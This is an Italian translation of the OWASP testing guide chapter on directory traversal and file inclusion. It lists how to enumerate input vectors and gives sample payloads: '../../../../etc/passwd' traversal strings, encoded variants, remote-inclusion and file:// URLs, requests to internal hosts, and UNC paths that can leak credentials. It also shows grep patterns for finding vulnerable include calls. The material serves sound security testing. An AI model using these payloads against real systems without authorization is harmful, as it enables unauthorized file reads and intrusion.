# WSTG-ATHZ-01

# Testing Directory Traversal File Include

## Summary

Molte web app usano e gestiscono file come da business logic.
Con l'uso di metodi di input validation non ben progettati o correttamente rilasciati, 
un aggressore può sfruttare il sistema per leggere o scrivere file che non erano pensati per essere accessibili.
In situazioni particolari, potrebbe essere possibile eseguire codice arbitrario o comandi di sistema.

Tradizionalmente, i web server e le web app implementano meccanismi di autenticazione per controllare l'accesso a file e a risorse.
I web server provano a confinare i file degli utenti in una "root directory" o una "web document root", che rappresenta una directory fisica sul file system.
Gli utenti devono considerare questa directory come la directory base nella struttura gerarchica della web app.

La definizione dei privilegi è realizzata usando le Access Control List (ACL) che identificano quali utenti o gruppi possono accedere, modificare, o eseguire uno specifico file sul server.
Questi meccanismi sono progettati per impedire a utenti malevoli di accedere a file sensibili (per esempio, il file /etc/passwd su un sistema UNIX-like) o per evitare l'esecuzione di comandi di sistema.

Molte web app usano script server-side per includere diversi tipi di file.
È molto diffuso l'uso di questo metodo per gestire immagini, template, caricare testi statici, e così via.
Sfortunatamente, queste app soffrono di vulnerabilità di sicurezza se i parametri di input (es. parametri di form, valori di cookie) non sono correttamente validati.

Nei web server e nelle web app, questo tipo di problema insorge sotto forma di attacchi di path traversal/file include.
Sfruttando questo tipo di vulnerabilità, un attaccante è in grado di 
leggere le directory o i file che normalmente non può leggere, 
accedere a dati al di fuori della web document root, o 
includere script e altri tipi di file da siti esterni.

Ai fini della OWASP Testing Guide, verranno considerate solo le minacce di sicurezza delle web app e non quelle dei web server (es. il famigerato "%5c escape code" dei web server Microsoft IIS).

Questo tipo di attacco è conosciuto anche come dot-dot-slash (`../`), directory traversal, directory climbing, o backtracking.

Durante un assessment, per individuare le vulnerabilità di path traversal e file include, i tester devono seguire due fasi:

- Input Vector Enumeration (una valutazione sistematica di ogni vettore di input)
- Testing Techniques (una valutazione metodica di ogni tecnica di attacco usata da un attaccante per sfruttare la vulnerabilità)

## How to Test

### Black-Box Testing

#### Input Vectors Enumeration

Per determinare quale parte dell'app è vulnerabile all'input validation bypassing, il tester deve enumerare tutte le parti dell'app che accettano contenuto dall'utente.
Sono incluse le query HTTP GET e POST e le opzioni come i file upload e i form HTML.

Ecco degli esempi di controlli da eseguire in questa fase:

- ci sono parametri della richiesta che possono essere usati per operazioni relative ai file?
- ci sono estensioni di file inusuali?
- ci sono nomi di variabili interessanti?
	- `http://example.com/getUserProfile.jsp?item=ikki.html`
	- `http://example.com/index.php?file=content`
	- `http://example.com/main.cgi=home=index.htm`
- è possibile identificare i cookie usati dalla web app per la generazione dinamica di pagine o template?
	- `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
	- `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`

#### Testing Techniques

La fase successiva del test è l'analisi delle funzioni di input validation presenti nella web app.
Usando l'esempio precedente, la pagina dinamica `getUserProfile.jsp` carica informazioni statiche da un file e mostra il contenuto all'utente.
Un attaccante potrebbe inserire la string malevola `../../../../etc/passwd` per includere il particolare file UNIX.
Ovviamente, questo tipo di attacco è possibile solo se la validazione fallisce;
e se nel rispetto dei privilegi del file system, la web app è in grado di leggere il file.

Per verificare correttamente questa vulnerabilità, il tester deve essere a conoscenza del sistema sotto test e la posizione dei file richiesti.
Non ha senso richiedere il file /etc/passwd su un web server IIS.

`http://example.com/getUserProfile.jsp?item=../../../../etc/passwd`

Per l'esempio del cookie:

`Cookie: USER=1826cc8f:PSTYPE=../../../../etc/passwd`

È anche possibile includere file e script ospitati su siti esterni.

`http://example.com/index.php?file=http://owasp.org/malicious.txt`

Se i protocolli vengono accettati come argomenti, come nell'esempio precedente, è anche possibile recuperare file dal file system in questo modo.

`http://example.com/index.php?file=file:///etc/passwd`

Se i protocolli vengono accettati come argomenti, come nell'esempio precedente, è anche possibile interrogare i servizi locali o servizi su altri host.

`http://example.com/index.php?file=http://localhost:8080`

`http://example.com/index.php?file=http://192.168.0.2:9080`

L'esempio seguente mostra come è possibile visualizzare il codice sorgente di un componente CGI, senza usare alcun path traversal.

`http://example.com/main.cgi?home=main.cgi`

Il componente chiamato "main.cgi" si trova nella stessa directory dei file statici HTML usati dall'app.
In alcuni casi il tester deve codificare la richiesta usando caratteri speciali (come "." punto, "%00" null, ...) per raggirare i controlli sull'estensione dei file o per impedire l'esecuzione dello script.

Tip: 
È un errore comune per gli sviluppatori non aspettarsi ogni forma di encoding e quindi fare la validazione solo per la codifica base dei contenuti.
Se la string di test non ha successo, prova con un altro schema di encoding.

Ogni OS usa caratteri diversi come path separator:

- OS Unix-like:
	- root directory: `/`
	- path separator: `/`
- OS Windows:
	- root directory: `<drive-letter>:\`
	- path separator: `\`
- Mac OS:
	- root directory: `<drive-letter>:`
	- path separator: `:`

Dovremmo considerare i seguenti meccanismi di encoding dei caratteri:

- URL encoding e double URL encoding
	- `%2e%2e%2f` rappresenta `../`
	- `%2e%2e/` rappresenta `../`
	- `..%2f` rappresenta `../`
	- `%2e%2e%5c` rappresenta `..\`
	- `%2e%2e\` rappresenta `..\`
	- `..%5c` rappresenta `..\`
	- `%252e%252e%255c` rappresenta `..\`
	- `..%255c` rappresenta `..\` e così via.
- Unicode/UTF-8 encoding (funziona solo su sistemi che sono in grado di accettare sequenze UTF-8 molto lunghe)
	- `..%c0%af` represents `../`
	- `..%c1%9c` represents `..\`

Ci sono altre considerazioni specifiche sui OS e sugli app framework.
Windows è flessibile nel suo parsing dei path dei file.

- Windows shell: 
aggiungendo uno qualsiasi dei seguenti caratteri ai path usati in un comando shell non comporta differenze nel risultato
	- `<` e `>` alla fine del path
	- `"` (chiuse adeguatamente) alla fine del path
	- marcatori estranei della directory corrente come `./` o `.\`
	- marcatori estranei della parent directory con oggetti arbitrari che potrebbero o meno esistere. Esempi:
		- `file.txt`
		- `file.txt...`
		- `file.txt<spaces>`
		- `file.txt""""`
		- `file.txt<<<>>><`
		- `./././file.txt`
		- `file.txt`
		- `nonexistant/../file.txt`
- Windows API: 
i seguenti oggetti sono scartati quando sono usati in qualsiasi comando o chiamata API in cui una string è presa come filename:
	- punti
	- spazi
- Windows UNC Filepaths:
usati per i riferimenti ai file negli share SMB.
A volte, un'app potrebbe far riferimento a un filepath UNC.
In questo caso, il Windows SMB sever potrebbe inviare le credenziali, che potrebbero essere catturate e cracked da un attaccante.
Potrebbe anche essere usato con un indirizzo IP o un domain name riferito a se stesso per evadere i filtri, o usato per accedere a file su share SMB inaccessibili all'attaccante, ma accessibili dal web server.
	- `\\server_or_ip\path\to\file.abc`
	- `\\?\server_or_ip\path\to\file.abc`
- Windows NT Device Namespace:
usato per riferirsi al Windows device namespace.
Alcuni riferimenti permetteranno l'accesso al file system usando un path diverso.
	- potrebbe essere equivalente a una drive letter come `c:\`, o a un drive volume senza una lettera assegnata
	`\\.\GLOBAL_ROOT\Device\HarddiskVolume1\`
	- riferirsi al primo disk drive sulla macchina
	`\\.\CdRom0\`

### Gray-Box Testing

Quando l'analisi è eseguita con un approccio gray-box testing, i tester devono seguire la stessa metodologia del black-box testing.
Comunque, dato che possono controllare il codice sorgente, è possibile cercare i vettori di input più facilmente e accuratamente.
Durante una source code review, possono usare semplici tool (come il comando `grep`) per cercare uno o più pattern comuni nel codice dell'app: metodi/funzioni di inclusione, operazioni sul file system, e così via.

- PHP: `include()`,`include_once()`,`require()`,`require_once()`,`fopen()`,`readfile()`, ...
- JSP/Servlet: `java.io.File()`, `java.io.FileReader()`, ...
- ASP: `include file`, `include virtual`, ...

Usando i motori di ricerca di codice online (es. Searchcode), potrebbe essere possibile trovare vulnerabilità di path traversal su software Open Source pubblicato su Internet.

Per PHP, i tester possono usare:

`lang:php (include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)`

Usando il metodo di gray-box testing, è possibile scoprire vulnerabilità che è di solito difficile scoprire, o anche impossibile da trovare durante un assessment black-box standard.

Alcune web app generano pagine dinamiche usando i valori e i parametri memorizzati nel database.
Potrebbe essere possibile inserire string di path traversal appositamente preparate quando l'app aggiunge dati al database.
Questo tipo di problemi di sicurezza sono difficili da scoprire a causa del fatto che i parametri nelle funzioni di inclusione sembrano interni e "sicuri" ma nella realtà non lo sono.

Inoltre, analizzando il codice sorgente è possibile analizzare le funzioni che gestiscono gli input invalidi: alcuni sviluppatori provano a cambiare l'input invalido per renderlo valido, evitando warning ed errori.
Queste funzioni sono di solito inclini a problemi di sicurezza.

Considera una web app con queste istruzioni:

```
filename = Request.QueryString(“file”);
Replace(filename, “/”,”\”);
Replace(filename, “..\”,””);
```

Puoi verificare la vulnerabilità in questo modo:

```
file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini
```

### Tools

- DotDotPwn
- Path Traversal Fuzz Strings
- OWASP ZAP
- Burp Suite
- Encoding/Decoding tools
- grep
- DirBuster